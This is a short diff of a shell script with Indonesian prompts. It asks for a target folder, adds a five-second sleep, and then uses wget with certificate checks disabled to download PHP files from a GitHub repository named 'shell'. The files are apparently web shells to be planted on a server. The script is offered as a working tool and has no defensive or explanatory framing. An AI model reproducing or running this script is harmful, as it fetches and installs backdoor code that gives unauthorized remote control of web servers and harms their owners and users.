@@ -3,6 +3,7 @@
 echo Masukkan nama folder:
 read varname
 echo Tembak folder: $varname
+sleep 5
 mkdir x
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
